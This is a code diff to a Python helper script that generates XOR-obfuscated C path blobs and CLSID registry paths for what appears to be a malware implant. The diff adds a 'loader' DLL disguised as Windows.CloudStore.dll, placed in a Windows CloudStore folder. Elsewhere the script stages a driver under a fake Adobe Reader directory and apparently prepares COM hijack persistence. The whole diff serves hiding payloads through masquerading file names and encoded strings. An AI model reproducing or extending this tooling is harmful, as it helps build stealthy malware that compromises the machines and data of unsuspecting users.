@@ -13,6 +13,7 @@ DEFAULT_SYS_SUBDIR = "Downloads"
 DEFAULT_SYS_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563"
 DEFAULT_DLL_DIR = r"%LOCALAPPDATA%\Microsoft\Windows\CloudStore\Shell"
 DEFAULT_DLL = "Windows.CloudStore.Schema.Shell.dll"
+DEFAULT_LOADER = "Windows.CloudStore.dll"
 GUID_RE = re.compile(
     r"^\{?([0-9A-Fa-f]{8})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{12})\}?$"
 )
@@ -204,6 +205,34 @@ def print_paste_sys(drop_dir: str, sys_name: str, sys_subdir: str) -> None:
     print_sys_path_usage(sys_path)
 
 
+def print_loader_paste(drop_dir: str, loader_name: str) -> None:
+    """Loader DLL path blob for vcruntime140.c (e_loader_path)."""
+    drop_dir = normalize_win_path(drop_dir)
+    loader_path = f"{drop_dir}\\{normalize_dll_name(loader_name)}"
+    enc = xor_encode(loader_path)
+    n = len(enc)
+    print(f"  #define LOADER_PATH_LEN {n}")
+    print(format_c_array(enc, "e_loader_path"))
+    print("  char loader_path[512];")
+    print("  memset(loader_path, 0, sizeof(loader_path));")
+    print(f"  xd(e_loader_path, loader_path, LOADER_PATH_LEN);")
+    print("  path_expand(loader_path, sizeof(loader_path), fExpandEnvironmentStringsA);")
+    print()
+
+
+def print_loader_block(drop_dir: str, loader_name: str) -> None:
+    loader_path = f"{normalize_win_path(drop_dir)}\\{normalize_dll_name(loader_name)}"
+    print("; --- loader drop path (Windows.CloudStore.dll) ---")
+    enc = xor_encode(loader_path)
+    print(f"  #define LOADER_PATH_LEN {len(enc)}")
+    print(format_c_array(enc, "e_loader_path"))
+    print("  char loader_path[512];")
+    print("  memset(loader_path, 0, sizeof(loader_path));")
+    print("  xd(e_loader_path, loader_path, LOADER_PATH_LEN);")
+    print("  path_expand(loader_path, sizeof(loader_path), fExpandEnvironmentStringsA);")
+    print()
+
+
 def print_paste_dll(drop_dir: str, dll_name: str) -> None:
     """DLL-only drop: e_dll_dir1..N + e_dll_path (after .sys block; reuses sys_dir)."""
     drop_dir = normalize_win_path(drop_dir)
@@ -341,6 +370,11 @@ def build_parser() -> argparse.ArgumentParser:
         help=f'DLL filename under --dll-dir (default: {DEFAULT_DLL})',
     )
     parser.add_argument(
+        "--loader",
+        metavar="NAME",
+        help=f'Loader filename under --dll-dir (default: {DEFAULT_LOADER})',
+    )
+    parser.add_argument(
         "--suffix",
         default=DEFAULT_SUFFIX,
         help=f"Registry key suffix (default: {DEFAULT_SUFFIX})",
@@ -393,6 +427,10 @@ def build_parser() -> argparse.ArgumentParser:
         f'  python3 getCLSID.py --sys-dir "{DEFAULT_SYS_DIR}" --full \\\n'
         '    --dll-dir "%LOCALAPPDATA%\\...\\Shell" --dll "Windows.CloudStore.Schema.Shell.dll"\n'
         "\n"
+        "  # Loader path (sibling of proxy DLL)\n"
+        f'  python3 getCLSID.py --dll-dir "{DEFAULT_DLL_DIR}" \\\n'
+        f'    --loader "{DEFAULT_LOADER}"\n'
+        "\n"
         '  python3 getCLSID.py "{GUID}" --dll-dir "%LOCALAPPDATA%\\...\\Shell" \\\n'
         '    --dll "Windows.CloudStore.Schema.Shell.dll"\n'
     )
@@ -413,18 +451,25 @@ def main() -> int:
     with_code = args.with_code or not path_only
 
     if path_only and not args.drop_dir and not args.sys_dir and not args.dll_dir:
-        if not args.dll:
-            parser.error("need clsid, --sys-dir, --dll-dir, and/or -d with --dll/--full")
+        if not args.dll and not args.loader:
+            parser.error(
+                "need clsid, --sys-dir, --dll-dir, --loader, and/or -d with --dll/--full"
+            )
 
     if not path_only and args.drop_dir and not args.dll:
         parser.error("--dll is required when -d/--dir is set with a clsid")
 
     try:
         dll_name = normalize_dll_name(args.dll) if args.dll else None
+        loader_name = normalize_dll_name(args.loader) if args.loader else None
         sys_dir, dll_dir, include_sys = resolve_paths(args)
 
         if dll_name and not dll_dir:
             dll_dir = DEFAULT_DLL_DIR
+        if loader_name and not dll_dir:
+            dll_dir = DEFAULT_DLL_DIR
+        if args.loader and not loader_name:
+            loader_name = DEFAULT_LOADER
 
         paste = bytes_only and not with_code
 
@@ -436,6 +481,9 @@ def main() -> int:
             if dll_dir and dll_name:
                 print_section("DLL drop (uses e_dll_dir*; paste after .sys block)")
                 print_paste_dll(dll_dir, dll_name)
+            if dll_dir and loader_name:
+                print_section("loader path (Windows.CloudStore.dll)")
+                print_loader_paste(dll_dir, loader_name)
         else:
             if sys_dir and include_sys:
                 print_dir_bundle(
@@ -443,6 +491,8 @@ def main() -> int:
                 )
             if dll_dir and dll_name:
                 print_dll_block(dll_dir, dll_name)
+            if dll_dir and loader_name:
+                print_loader_block(dll_dir, loader_name)
 
         if args.clsid:
             if paste:
@@ -457,6 +507,8 @@ def main() -> int:
                 verify_paths.append(("reg", reg_path(args.clsid, args.suffix)))
             if dll_dir and dll_name:
                 verify_paths.append(("dll", f"{dll_dir}\\{dll_name}"))
+            if dll_dir and loader_name:
+                verify_paths.append(("loader", f"{dll_dir}\\{loader_name}"))
             if sys_dir and include_sys:
                 sd = f"{sys_dir}\\{args.sys_subdir}"
                 verify_paths.extend(
